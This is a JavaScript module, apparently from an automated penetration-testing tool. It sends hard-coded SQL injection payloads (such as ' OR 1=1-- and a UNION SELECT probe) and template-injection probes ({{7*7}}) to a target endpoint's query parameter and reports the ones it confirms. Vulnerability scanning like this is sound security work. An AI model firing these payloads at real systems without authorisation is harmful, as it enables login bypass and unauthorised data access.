/**
 * sqliSstiEngine.js — Deterministic Attack Engine
 * Bypasses LLM hallucinations to guarantee execution of known good
 * boolean/union SQLi and SSTI math payloads for fast, reliable verification.
 */

import { execute as payloadExecute } from '../../utils/payloadExecutor.js';

const SQLI_PAYLOADS = [
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL,NULL--",
    "1 AND (SELECT 1)=1",
    "1' AND 1=2--"
];

const SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<% 7*7 %>"
];

export async function runDeterministicSqliSsti(hypothesis, onProgress) {
    if (!hypothesis?.endpoint) return [];

    const vulns = [];
    const isSqli = hypothesis.type.toLowerCase().includes('sql');
    const payloadsToTry = isSqli ? SQLI_PAYLOADS : SSTI_PAYLOADS;
    const targetIndicator = isSqli ? 'SQLi' : 'SSTI';

    onProgress({
        phase: 'exploitation', status: 'running',
        message: `⚙️ [Deterministic Engine] Testing ${payloadsToTry.length} payloads for ${targetIndicator} on ${hypothesis.endpoint}`
    });

    for (const payload of payloadsToTry) {
        try {
            const result = await payloadExecute({
                url: hypothesis.endpoint,
                method: 'GET', // Expand if needed based on recon
                payload,
                paramName: hypothesis.paramName || (hypothesis.endpoint.includes('?') ? hypothesis.endpoint.split('?')[1].split('=')[0] : 'q'),
                injectIn: 'query'
            });

            if (result && result.findings && result.findings.length > 0) {
                const confirmed = result.findings.filter(f => f.confidence === 'confirmed' || f.confidence === 'high');
                if (confirmed.length > 0) {
                    onProgress({
                        phase: 'exploitation', status: 'running',
                        message: `🚨 [Deterministic Engine] SUCCESS: Confirmed ${targetIndicator} using ${payload}`
                    });
                    vulns.push(...confirmed);
                    break; // Stop spinning on success
                }
            }
        } catch (e) {
            // Ignore execution failures per payload
        }
    }

    return vulns;
}
